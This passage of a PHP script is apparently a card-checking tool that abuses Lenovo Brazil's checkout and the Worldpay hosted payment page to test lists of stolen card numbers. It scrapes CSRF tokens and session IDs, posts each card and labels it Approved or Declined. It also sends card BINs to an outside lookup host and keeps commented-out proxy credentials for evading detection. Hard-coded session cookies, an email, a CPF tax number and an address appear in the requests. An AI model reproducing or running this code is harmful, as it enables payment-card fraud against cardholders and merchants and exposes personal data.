inside-us3=475423675-c2df5c870c72ff9fc42b1e0644dcdb91e87dbf9a6b66604c4478750fe852472b-0-0; _abck=A49D5F567F12B7FBC592245CF319434B~0~YAAQzUIVAmY0opWXAQAA2O7Fsw4huLcOXjMpcqYWhe9C/i3N5seElHO4G3ZFcsGyYUKCrcoRugYyTGjE7ywqmJdhrq4Vj5ev7xrECK9LSzIatIGh5KSBX8HddZN+AURG1QMR3iNAboFL0DBVEjqmY+O+RrZ40lwso8KklRRQsQtFB1zPg2kWzXeG1wx9iAWvGwEQ/yNlFqfINVT60i7io23iASYgkraQM+vxEuHkSsm0bO3IN9b5VqlxdFTPs0GjDclgxuMkl/9aTByqbs8lWdww/h78CDghmaooJpd6pq0ohChO6nNvQ0vjB6OT0Y8/0ENLpJDexORlUww+5Q5DIGZCdvbdjBrcexMFHwAkd2oPDbuiv/OhcKNCtN+g2idthxXlq9SCCqJeyVQOKTC+rsqB8TZpetPby3PEarfVlrkHzZWLT9c2aZro+z978yBmmdNb05hVRDw66Qi222DgPw8BwUjRAQHxrZsiBNpRsnKjSTiZBnhAGLmYIkfbx0eivw9BhgAPHG/9fSqzmz4j+v7UnuaZKuG/oRSmoWpIpURMWOroKm2U1Qoj45/SRPeRFFEoEoHSSXjsYb9oOZPpbERdyLFoiFFYbe+3bq+LjckXbf4YuB6PWD+qPp/IMlE3SBHOa1HfmoVX9/DcF1Wvz3resGxOgUV++/FZprCXG2gK5KbnSMkCJ/EYD0BvfCnfKxuIdFLhFmdL2ugY1g8nnKXJeBC3pWqKA3MTXg/ns61egBPJK6MK96/XIuVokMDlL1+GRzj0z3OUzTYvTo5M7sLJIL0W9hj2RpAupxtJv2lZqO5WhnaSo+rEKzeZDTVtF5jymMKpxI8N9yUX5DAJHVZkdQUNgQ8UJq+7OKwXmt1E2gLfXT7obtfeQmqxYLUimmNewgCfJryCk7TFO6WNJZ3+bv/J/OhvmpVZwlFjXve8kDziAXiNZDIZW9TPzS1Gt5AcBnd2Mub1JT4GS5nUkasTR59MToZVV5Sv9GAAbkH7Ww==~-1~-1~1751071382; RT="z=1&dm=lenovo.com&si=1ffffd76-aad8-4e14-9b4a-4d3bc9e7bb58&ss=mcfcbegi&sl=0&tt=0&bcn=%2F%2F17de4c16.akstat.io%2F"; QuantumMetricSessionID=730deac6ec53093eca27c5364577bdba',
//     'host: openapi.lenovo.com',
//     'origin: https://www.lenovo.com',
//     'referer: https://www.lenovo.com/br/pt/checkout.html',
//     'sec-ch-ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
//     'sec-ch-ua-mobile: ?0',
//     'sec-ch-ua-platform: "Windows"',
//     'sec-fetch-dest: empty',
//     'sec-fetch-mode: cors',
//     'sec-fetch-site: same-site',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
//   ],
// ]);

// $response = curl_exec($curl);


// $curl = curl_init();
// curl_setopt_array($curl, [
//   CURLOPT_URL => 'https://openapi.lenovo.com/br/pt/api/checkout/billing',
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 30,
//   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
//   CURLOPT_CUSTOMREQUEST => 'POST',
//   CURLOPT_POSTFIELDS => 'customizeBillingAddress=0&cardHolderName=casa%20casasg&itemId=&firstname=casa&lastname=casasg&line1=Avenida%20Marechal%20Mascarenhas%20de%20Moraes&line2=&line3=123&town=Recife&region=BR-PE&regionShort=PE&regionName=Pernambuco&postalcode=51150-001&phone1=11999151515&extPhone1=&phone2=&extPhone2=&cellphone=&company=&companyTaxNumber=&email=sgasgagas%40gmail.com&countryName=Brazil&countryCodeIso=br&abnCode=&managerEmail=&shippingFlag=false&billingFlag=false&defaultShippingAddress=false&defaultBillingAddress=false&bpId=&fax=&useDeliveryAddressForwlh=&wlhPersonalNumber=&o2oStorePhone=&o2oStoreEmail=&district=Imbiribeira&consumerTaxNumber=902.062.901-87&individualRGID=ISENTO&dni=&otpIn=false&crmAddressFlag=&type=&rr=',
//   CURLOPT_HTTPHEADER => [
//     'accept: */*',
//     'accept-encoding: gzip, deflate, br, zstd',
//     'accept-language: en-US,en;q=0.9',
//     'connection: keep-alive',
//     'content-type: application/x-www-form-urlencoded; charset=UTF-8',
//     'cookie: Path=/; Path=/; Path=/; zipcode=01000-000; city=S%C3%A3o+Paulo; timezone=America/Sao_Paulo; leid=2.m8K20k/i6hT; searchabran=1; PublicAlertPublicFirst=1; PublicAlertStoreFirst=isPublic; s_eng_rfd=0.00; _fbp=fb.1.1751046393214.31356298219447639; _ga=GA1.1.1432766635.1751046394; _gcl_au=1.1.957527426.1751046394; AMCV_F6171253512D2B8C0A490D45%40AdobeOrg=MCMID|46361539299034570393334928877530780822; _tt_enable_cookie=1; _ttp=01JYS7Z53S5XKTAMTE5YBPVA1Y_.tt.1; _clck=2x8go5%7C2%7Cfx4%7C0%7C2004; QuantumMetricUserID=e3d48c92a634cea46b46001379ad7431; kndctr_F6171253512D2B8C0A490D45_AdobeOrg_identity=CiY0NjM2MTUzOTI5OTAzNDU3MDM5MzMzNDkyODg3NzUzMDc4MDgyMlISCImi%5FpP7MhABGAEqA1ZBNjAAoAGhov6T%2DzKoAczv9%5FX7qPrjCLABAfABiaL%2Dk%5Fsy; __idcontext=eyJjb29raWVJRCI6IjJ6Nkw2VllsSnFGTVRvV1V1cml2eW9GYlZFQiIsImRldmljZUlEIjoiMno2TDZYSWpacTNrM1RsSkFxdG85TWJqc0NaIiwiaXYiOiIiLCJ2IjoiIn0%3D; kndctr_F6171253512D2B8C0A490D45_AdobeOrg_consent=general%3Din; algorithmId_adobe=%7B%22pagefilterId%22%3A%22158f0d86-c70f-491c-984a-1fb8ef986109%22%2C%22algorithmId%22%3Anull%7D; recentlypns=4X90L13971; BVBRANDID=dec0fc2e-96b5-4376-99c0-645fc3762a5e; cartProductCodes=4X90L13971; publicStoreAlertHide=1; publicAlertHasCart=true; ttcsid=1751046395014::NWg4iXnZDZ0t5cD39tqE.1.1751047387850; _uetsid=aa9829b0537e11f089d449baa26539ac; _uetvid=aa984950537e11f0af019583c4c70518; _clsk=lumj5i%7C1751060129010%7C1%7C1%7Ce.clarity.ms%2Fcollect; ttcsid_CHJQK1JC77UBJAEB22VG=1751060576668::1QqwGIgn8Oq-ruTs5tcA.2.1751060578611; _ga_LXNLK45HZF=GS2.1.s1751060580$o2$g0$t1751060580$j60$l0$h0; _ga_YF4MBY08PJ=GS2.1.s1751060580$o2$g0$t1751060580$j60$l0$h0; _ga_1X0P7YKFM5=GS2.1.s1751060580$o2$g0$t1751060580$j60$l0$h0; orderAdobeTool=%7B%22j%22%3A%221.6%22%2C%22c%22%3A24%2C%22s%22%3A%221366x768%22%2C%22bw%22%3A1366%2C%22bh%22%3A641%2C%22v%22%3A%22N%22%2C%22k%22%3A%22Y%22%2C%22ce%22%3A%22UTF-8%22%7D; s_vnc365=1782596582102%26vn%3D2; s_eVar57=%3B4X90L13971%3B%3B%3B%3BeVar239%3DNo; email_256=sgasgagas@gmail.com; bm_sz=1992C77F806B54A48453CA6A2013FC25~YAAQzUIVAupTfpWXAQAAo4ZZsxy8sITqgENL1WIfsfIlnghwznKaNAPVRiRLMP3Q/2NxbN64PJaFyGek5vC/oP52b/J9+cYcTxA7SOTZ1uSj5WJQTIJ9myYkUOFMQUvn7rUP2/20okZyoYcdR4ny0xN8ckRCDBvkqUMmXebxzo2JiBMWqukq+SbjLfFcdFWnJmTz+/JhEF/2YoAspLdeNV7JmfakvkF7RP5ZoBce3TO2Yvmn0mCKRbcPaY9zSilKmNaufgzO2B3wFKmTvyaVxfiwcWD4NCxyNFULbDUMFq8LslPBlTE8aRQnY9cSTggWjiJ2WpoK2/kSCKvrLRkE+TC4vhKUtMssIncG2P+BdjbxDlHJrkXfKAM/5fNr85NYIgA5XXBj3EZ7hGO4LHEGhPGcn05bhzjLVHG552ZR9BNHIsxsuFL2CussHKauyQ==~3490615~4342838; s_tslv=1751060679600; s_tot_rfd=2.08; mp_lenovo_br_mixpanel=%7B%22distinct_id%22%3A%20%22197b27f90db299-01c47106e1b1d88-26011e51-100200-197b27f90dcdad%22%2C%22bc_persist_updated%22%3A%201751060606428%2C%22has_item_in_cart%22%3A%20false%2C%22bc_id_cache%22%3A%20%22%7B%5C%22email%5C%22%3A-1737812822%7D%22%2C%22bc_id%22%3A%20-1737812822%7D; inside-us3=475423675-c2df5c870c72ff9fc42b1e0644dcdb91e87dbf9a6b66604c4478750fe852472b-0-0; _abck=A49D5F567F12B7FBC592245CF319434B~0~YAAQzUIVAmY0opWXAQAA2O7Fsw4huLcOXjMpcqYWhe9C/i3N5seElHO4G3ZFcsGyYUKCrcoRugYyTGjE7ywqmJdhrq4Vj5ev7xrECK9LSzIatIGh5KSBX8HddZN+AURG1QMR3iNAboFL0DBVEjqmY+O+RrZ40lwso8KklRRQsQtFB1zPg2kWzXeG1wx9iAWvGwEQ/yNlFqfINVT60i7io23iASYgkraQM+vxEuHkSsm0bO3IN9b5VqlxdFTPs0GjDclgxuMkl/9aTByqbs8lWdww/h78CDghmaooJpd6pq0ohChO6nNvQ0vjB6OT0Y8/0ENLpJDexORlUww+5Q5DIGZCdvbdjBrcexMFHwAkd2oPDbuiv/OhcKNCtN+g2idthxXlq9SCCqJeyVQOKTC+rsqB8TZpetPby3PEarfVlrkHzZWLT9c2aZro+z978yBmmdNb05hVRDw66Qi222DgPw8BwUjRAQHxrZsiBNpRsnKjSTiZBnhAGLmYIkfbx0eivw9BhgAPHG/9fSqzmz4j+v7UnuaZKuG/oRSmoWpIpURMWOroKm2U1Qoj45/SRPeRFFEoEoHSSXjsYb9oOZPpbERdyLFoiFFYbe+3bq+LjckXbf4YuB6PWD+qPp/IMlE3SBHOa1HfmoVX9/DcF1Wvz3resGxOgUV++/FZprCXG2gK5KbnSMkCJ/EYD0BvfCnfKxuIdFLhFmdL2ugY1g8nnKXJeBC3pWqKA3MTXg/ns61egBPJK6MK96/XIuVokMDlL1+GRzj0z3OUzTYvTo5M7sLJIL0W9hj2RpAupxtJv2lZqO5WhnaSo+rEKzeZDTVtF5jymMKpxI8N9yUX5DAJHVZkdQUNgQ8UJq+7OKwXmt1E2gLfXT7obtfeQmqxYLUimmNewgCfJryCk7TFO6WNJZ3+bv/J/OhvmpVZwlFjXve8kDziAXiNZDIZW9TPzS1Gt5AcBnd2Mub1JT4GS5nUkasTR59MToZVV5Sv9GAAbkH7Ww==~-1~-1~1751071382; RT="z=1&dm=lenovo.com&si=1ffffd76-aad8-4e14-9b4a-4d3bc9e7bb58&ss=mcfcbegi&sl=0&tt=0&bcn=%2F%2F17de4c16.akstat.io%2F"; QuantumMetricSessionID=730deac6ec53093eca27c5364577bdba; kndctr_F6171253512D2B8C0A490D45_AdobeOrg_cluster=va6; ak_bmsc=C60E04088CD414BA75854713C404BBB4~000000000000000000000000000000~YAAQzUIVAq5Lr5WXAQAA9TH3sxw9Dr3Gm942/GFkHg0K587j/9Gahg5XujwvCs2ZrgciBSUltLoVFbiNYi20Kp/FNV37fs4wvCoANB/uSMYNBZGmLgCIRoeB8er5EsH4VM0eOZtv3F2YBKGxxnSezL49e+UsoDK2MgFJjwYfsTr2zrbsZHwaQ5aIG5eZK55xumKC6XdM4rUgamEZR9I0MV1TX5i0A0cRZHANorjo1lvxaikdUOgWIvDWm9gh2paMNsLdpu7E/cnTMUVsDF6e86TeUmfQIwLj88QGaZdnP3Uj2U/Xryb7APeKAvMCzbldTFZh/3tp72ZhNq9QWIK6nZlDbt6Z+/zCKAzE; bm_sv=7EC2116A36B87EA318BADC50C0108A41~YAAQzUIVAvxLr5WXAQAADzP3sxyin3Aa7ngf5DTxJPmyp5AxJPxX8B7EUbc1md9YkvdeW7ZbVRPejhBNUdV8/STBU6CBMYYcBdJ87f2VvfuZth448DmWaPFZ+fp2cRkdXPBOpTFYEv7MSg8Kv+KWa5URnqhbki1drU1CI1hUoyRLLFEMSyEprjfdMyyvMxVXJODO5r0BvqdjEWGrYWd+bSdww0vw31Xpa6BwHJsOpXYQq6+yjsjkWKezlnAkH4Da~1',
//     'host: openapi.lenovo.com',
//     'origin: https://www.lenovo.com',
//     'referer: https://www.lenovo.com/br/pt/checkout.html',
//     'sec-ch-ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
//     'sec-ch-ua-mobile: ?0',
//     'sec-ch-ua-platform: "Windows"',
//     'sec-fetch-dest: empty',
//     'sec-fetch-mode: cors',
//     'sec-fetch-site: same-site',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
//   ],
// ]);

// $response = curl_exec($curl);

$cookies = 'Path=/; Path=/; Path=/; Path=/; Path=/; zipcode=20000-000; city=Rio+de+Janeiro; timezone=America/Sao_Paulo; AKA_A2=A; leid=2.VNl/F+sXbmt; PublicAlertPublicFirst=1; PublicAlertStoreFirst=isPublic; searchabran=74; s_inv=0; s_vnc365=1783869760250%26vn%3D1; s_ivc=true; s_dur=1752333760251; s_tot_rfd=1.83; s_eng_rfd=0.00; bm_mi=91D15D9490743D0107AED7F625FF464F~YAAQBXgQAqaDb/KXAQAADDs7/xydo7bVzJdr5+Vsu7Iv9IwcbnP3W84JLEbcDKRAbsYlzx20bY/svq4WpOkG+Dxzq5/wI2iGIMzUUGpt6ldZ+tFPa/vwJ2a/ugIJToC+8en0B98WKmouo87Zvn566qZOixMgpVPjdfC1fT0rrTYt29kNMIcliguVSL1qq/X3XLjzXQnBh4C+WLC9puR3dDfKBz2yin1qhidFE1Yw+gkMbDAlJvyoP/qzeJWPRBcNYVdlCgCtK139Upay4OSrJ+0Gq9TbTki+vUgbUaikyMqGsMO+CvrdA8Xrbp44j4cizjDiCTWN~1; ak_bmsc=11A48B0EDB720933BEA8A09918E038E8~000000000000000000000000000000~YAAQBXgQAsGDb/KXAQAAwT47/xxrPKReWj68ay7UTMHChIDHq3usNZ03+Wgo23EQN2xJu/CFp69yPSlc5PQveYWhL2wkbVSZVf6HMC1dqLvAYafDbHOAG2gAAP6ZQngrh89U6iwfjlKTc/CqYMq0yzfrU3UoTq7+hW6/Ro9Rh3IFzETxABaYiVb9gkzH+2l9T/7THt5zrcEtxkrK6hp+tlfZ0MjK3iUCUf94+JNhnneQYX8PKGNohFPWrXXTIKL/8BfBFEreLilcXasUzC7lMV0Sb6urF5mPq/RqmQu2nw5eknSD0B8qX9Zc1PclpGwgthARudbo81M1RVCI86NsY62laTP/VPejAkVFyxa8B5bIBwEuXWxDubpm98GhBeOz5n6oq3pZUjsQDV/1gOTQ7z0MjbDEBtQyzc+ByLHhagJEwgqXIecWXK0Yn5ecrjqtunwRpKNRhzzhKy0Tyc3MClr0ebAnfI2RIiB9gTwlgh6wFpxFLHc5; algorithmId_adobe=%7B%22pagefilterId%22%3A%22158f0d86-c70f-491c-984a-1fb8ef986109%22%2C%22algorithmId%22%3Anull%7D; cartProductCodes=GX30K79401; cartCount=%7B%22ca5a8c57ba5f3-457c-be1e-153a54f5a3dc%23%23null%23%23null%22%3A1%7D; _fbp=fb.1.1752333772767.662638277498304495; kndctr_F6171253512D2B8C0A490D45_AdobeOrg_cluster=va6; AMCV_F6171253512D2B8C0A490D45%40AdobeOrg=MCMID|66740324944908292243230483940635543621; kndctr_F6171253512D2B8C0A490D45_AdobeOrg_identity=CiY2Njc0MDMyNDk0NDkwODI5MjI0MzIzMDQ4Mzk0MDYzNTU0MzYyMVISCP%5FX7fn%5FMhABGAEqA1ZBNjAAoAGF2O35%5FzKoAdnSiKucjaTXebABAfAB%5F9ft%2Df8y; kndctr_F6171253512D2B8C0A490D45_AdobeOrg_consent=general%3Din; publicStoreAlertHide=1; publicAlertHasCart=true; _uetsid=16889c305f3411f098bf67ac0ba556cf; _uetvid=168890a05f3411f08cec211beda8f8ac; _tt_enable_cookie=1; _ttp=01JZZKPYEA7CDCCRW2WEVG306F_.tt.1; ttcsid=1752333777358::p5mSMgXlX6WyaR7Ue4QT.1.1752333777358; _ga=GA1.1.1786242868.1752333777; _gcl_au=1.1.1905989335.1752333777; _clck=1yw49re%7C2%7Cfxj%7C0%7C2019; _clsk=pb2nwf%7C1752333778244%7C1%7C1%7Cj.clarity.ms%2Fcollect; QuantumMetricSessionID=a57d7f1d34b08b76e73ad6f72de59bab; QuantumMetricUserID=22be49e100d864e990e77a86071a8e76; __idcontext=eyJjb29raWVJRCI6IjJ6bVFUdmFCZ3FNZGx2bTZZa3ZScFFDaTJiRyIsImRldmljZUlEIjoiMnptUVR0MkJYdHpnUXZsYXJoRjhGMVhFRm1NIiwiaXYiOiIiLCJ2IjoiIn0%3D; ttcsid_CHJQK1JC77UBJAEB22VG=1752333777358::YCH3Ii9BXcYdIYK2PDJK.1.1752333780722; _ga_LXNLK45HZF=GS2.1.s1752333777$o1$g0$t1752333782$j55$l0$h0; _ga_YF4MBY08PJ=GS2.1.s1752333777$o1$g0$t1752333782$j55$l0$h0; _ga_1X0P7YKFM5=GS2.1.s1752333777$o1$g0$t1752333782$j55$l0$h0; s_tslv=1752333783404; orderAdobeTool=%7B%22j%22%3A%221.6%22%2C%22c%22%3A24%2C%22s%22%3A%221536x864%22%2C%22bw%22%3A1494%2C%22bh%22%3A710%2C%22v%22%3A%22N%22%2C%22k%22%3A%22Y%22%2C%22ce%22%3A%22UTF-8%22%7D; inside-us3=480879326-91fe36edc2600794135c07562d9fa7a3cc92b2ffd15bf1587ab03afe28285a26-0-0; s_eVar57=%3BGX30K79401%3B%3B%3B%3BeVar239%3DNo; mp_lenovo_br_mixpanel=%7B%22distinct_id%22%3A%20%22197ff3b75a5214-0d686c4af161698-46504b58-144000-197ff3b75a614d0%22%2C%22bc_persist_updated%22%3A%201752333874934%2C%22bc_id_cache%22%3A%20%22%7B%5C%22email%5C%22%3A-1501150434%7D%22%2C%22bc_id%22%3A%20-1501150434%7D; email_256=tropikvictorycapital.groupltda@gmail.com; _abck=253074D3F88966035A17E77A9EBF30C4~0~YAAQBXgQAkWLb/KXAQAABzQ9/w5mo0tmxUeSjZGnG+gnm8AtaSEL8P4U979ID4+Ckl64Zz/+HXHKvnng7Nf9VHtiFgabWoHlwwMZSCvwMZAVznS3nOXMQEIjYs8Jy6qMf6Y6iNU+lnmoQCYElVoxFU+1w5cwoG1XnZ76eZ8C8/GujEekXy9DDtiQiz5YeqxpjjAg7HDEZpwMmx4jEnFJpo0azaJgiKYdF0RuEto3ylS2Gnv8Mg4cpwcEJnSTDnTREhouy6Q1/13VQ4B6fKr7m9+yftaNd9bPObG2jf6KV5aUZGaRQNfVvDWqqaenZErWtaJvFJI/6exzEK/XfYJYaQlLDE+V9TYjNvlfhQrjbYDbBqoo5Mu9V8XaKbZwkkcBU5/kAB9tiwGzy6MjepJa/aBQXCDSVbRrzJINw/vOd4olNgTeZHSk6ELpMhnxb7Fm7xeam3DudVGq4QB8BssaT5Na7u9JjZ5qM0WrvrTWkNplMtEArsfwvH68Lb0+vlsKuiABMRR3+YZhqLCa1PlwSnbFLcDmlfEqAVsz34Wgbh0qA9eXfqgXMcGqyS3AlT6yjK2KkCDuzJCCX/O1q82vBHyd/y9BqCm8rh5+VMj8oNT8LXE1rB43ND81GndmDuYf8ACWaOkRTZ3MLJOGsrEp0dqxr5LMU/XTVryeeopMlcwQ7ceViXiypNAwTorm2E0vcePPEebhh7pTDTmJ1fw9sXdaeepFQH5PTpjYVwvLdVHq3dxz34AHjBXjDscrZ5yN2q8w7cyE7mG0vCtw6u9Z1Naqjju93Q==~-1~-1~1752337356; bm_sz=1502E018C022829933F02574EB9BB2D3~YAAQBXgQAkeLb/KXAQAABzQ9/xzKqTMiazuj4KRWFTIOeF9cSbO0IqIoxr59GHlfWg46iYe4EPLO1oTQeKgQjcsX8LoBoxWeb6pNWgfXYDNgS3jZSbY6eQ739S9hdRS/Dwm3eJSiaFyPs0UyC0IcbIlCgTo2V1iFnq+oijDA3hOQlyUqUiHpyFCy2FYzLfTuAz9BRlIUWjImGFSVY+ySu3/XVH4myGI1UZYImK2/+IteHq7OATBqE1M1dQoKNFd973DQVINefYBs0gAP0hvtFpVlenljK30ThctReGAu/CAni+ezlyePDy+C8OUY5wDBhwVp5E1pORmzaeYnd9AdJiRCUaUEAOIEcKScNEkWQEeAGIwU1+Sgfn8zfNSTFp3j3wWKMNLIjuvBEdH2anvEiuFx1g+2gABVLbMaVaLV1AkwmTZ0HhZWg0EsQ4f0Cl1Fhj4dp1N1pTqZULjHhGNNP72z5HFr0JInU9A=~4538674~3224642; RT="z=1&dm=lenovo.com&si=a8f2e3c5-1317-4f99-bdc5-1c4617fd6c0a&ss=md0e9ucy&sl=6&tt=48s&bcn=%2F%2F17de4c14.akstat.io%2F"; bm_sv=955AB1424BF1951D1FC9044899A6EDAA~YAAQP0LbF5Q+ofKXAQAAkUhH/xzC6CFr0fjPSsaq7IDlA8RdwBBY/VPh4gxVi4T3gS3nnj83svYF3mq6fIZFal9N6iV0BurTIYDtOTU1CE6OehQ2iY8/DRljr+amMsdrmIa+EcHufnoxiUiYq69c4bjUneR0emzDVmhlOk3DB8NTbxCqyJfegKqFxHbKk2FbAHPM3zcZAJ7VNUKYxPYVybxe6Ybg+j7+Q66bP4c/h9dUM2HjeUcKvDxMpcEw8Q1oUA==~1';

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://openapi.lenovo.com/br/pt/api/checkout/payment/cc/iframe',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'recaptcha=&rr=false',
  CURLOPT_HTTPHEADER => [
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'cookie: '.$cookies.'',
    'host: openapi.lenovo.com',
    'origin: https://www.lenovo.com',
    'referer: https://www.lenovo.com/br/pt/checkout.html',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
  ],
]);

$response = curl_exec($curl);

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://openapi.lenovo.com/br/pt/api/checkout/payment/cc/iframe',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_CUSTOMREQUEST => 'POST',
  // CURLOPT_COOKIEJAR => $dirCcookies,
  // CURLOPT_COOKIEFILE => $dirCcookies,
  CURLOPT_POSTFIELDS => 'recaptcha=&rr=false&installmentNum=1',
  CURLOPT_HTTPHEADER => [
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'cookie: '.$cookies.'',
    'host: openapi.lenovo.com',
    'origin: https://www.lenovo.com',
    'referer: https://www.lenovo.com/br/pt/checkout.html',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
  ],
]);

$generateKey = curl_exec($curl);

$urliframeekk = getStr($generateKey, '"ccIframeUrl":"','"' , 1);
$orderkeyy = getStr($urliframeekk, 'OrderKey=','&Ticket' , 1);
$tickettt = getStr($urliframeekk, '&Ticket=','"' , 1);

if ($urliframeekk == null) {

die("iframe nao obtido...");

}

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://hpp.worldpay.com/app/hpp-iframe/integration/wpg/corporate?OrderKey='.$orderkeyy.'&Ticket='.$tickettt.'&iframeIntegrationId=1750995570720&checkoutURL=https%3A%2F%2Fwww.lenovo.com%2Fbr%2Fpt%2Fcheckout.html%23payment&iframeOrigin=https%3A%2F%2Fwww.lenovo.com&language=pt&country=BR',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_HEADER => 1,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_COOKIEJAR => $dirCcookies,
  CURLOPT_COOKIEFILE => $dirCcookies,
  // CURLOPT_PROXY => 'na.lunaproxy.com:12233',
  // CURLOPT_PROXYUSERPWD => 'user-rimuro_Q8uqX-region-us:Rimuro321',
  // CURLOPT_PROXY => 'gw.dataimpulse.com:823',
  // CURLOPT_PROXYUSERPWD => '3aa9901655b2ffc3d97b:b6be13f7620aaab6',
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_HTTPHEADER => [
    'host: hpp.worldpay.com',
    'referer: https://www.lenovo.com/br/pt/checkout.html',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
  ],
]);

$getCookiesPage = curl_exec($curl);
$scsrfkk = getStr($getCookiesPage, '"csrf":{"v":"','"' , 1);
$jsessuinkk = getStr($getCookiesPage, 'process;jsessionid=','.os"' , 1);

if ($scsrfkk === null) {
    die("Erro: CSRF inválido essa tentativa.");
}

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://hpp.worldpay.com/app/hpp/146-0/payment/multicard/process;jsessionid='.$jsessuinkk.'.os',
  CURLOPT_HEADER => 1,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_COOKIEJAR => $dirCcookies,
  CURLOPT_COOKIEFILE => $dirCcookies,
  // CURLOPT_PROXY => 'na.lunaproxy.com:12233',
  // CURLOPT_PROXYUSERPWD => 'user-rimuro_Q8uqX-region-us:Rimuro321',
  // CURLOPT_PROXY => 'gw.dataimpulse.com:823',
  // CURLOPT_PROXYUSERPWD => '3aa9901655b2ffc3d97b:b6be13f7620aaab6',
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'selectedPaymentMethodName=&cardNumber='.$cc.'&cardholderName=pladix+oficial&expiryDate.expiryMonth='.$mes.'&expiryDate.expiryYear='.$anodoiss.'&securityCodeVisibilityType=OPTIONAL&mandatoryForUnknown=false&securityCode=&dfReferenceId=&cardinalDdcFields.browserJavaEnabled=&cardinalDdcFields.browserLanguage=&cardinalDdcFields.browserColourDepth=&cardinalDdcFields.browserScreenHeight=&cardinalDdcFields.browserScreenWidth=&cardinalDdcFields.browserJavaScriptEnabled=&cardinalDdcFields.timeZone=&riskSessionId='.$jsessuinkk.'&_csrf='.$scsrfkk.'&ajax=true',
  CURLOPT_HTTPHEADER => [
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'host: hpp.worldpay.com',
    'origin: https://hpp.worldpay.com',
    'referer: https://hpp.worldpay.com/app/hpp/146-0/payment/start;jsessionid='.$jsessuinkk.'.os',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    'x-hpp-ajax: 1',
    'x-requested-with: XMLHttpRequest'
  ],
]);

$resp = curl_exec($curl);

################################################################################################

$infobin = file_get_contents('https://chellyx.shop/dados/binsearch.php?bin=' . substr($cc, 0, 6));
$fim = microtime(true);
$tempoTotal = $fim - $inicio;
$tempoFormatado = number_format($tempoTotal, 2);
$messagekk = getStr($resp, 'data-page-title="Pagamento recusado" data-callback="','"' , 1);
$payementst = getStr($resp, 'paymentStatus&#034;:&#034;','&' , 1);
$pagettile = getStr($resp, 'data-page-title="','"' , 1);

if (strpos($resp, 'AUTHORISED') !== false) {

die('<span class="text-success">Approved</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Cartão verificado com sucesso. </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning">@pladixoficial</span><br>');

} elseif(strpos($resp, 'Pagamento bem-sucedido')) {

die('<span class="text-success">Approved</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Cartão verificado com sucesso. </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning">@pladixoficial</span><br>');

} elseif (strpos($resp, 'id="paymentResult"') !== false) {

die('<span class="text-danger">Declined</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> '.$pagettile.' - ('.$payementst.') </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning">@pladixoficial</span><br>');

} elseif (strpos($resp, 'paymentStatus') !== false) {

die('<span class="text-danger">Declined</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> '.$pagettile.' - ('.$payementst.') </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning">@pladixoficial</span><br>');

} else {

die('<span class="text-danger">Error</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> '.$resp.' </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning">@pladixoficial</span><br>');

}

?>
